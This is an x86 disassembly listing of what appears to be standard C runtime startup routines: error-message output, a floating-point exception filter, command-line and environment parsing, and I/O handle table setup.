  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
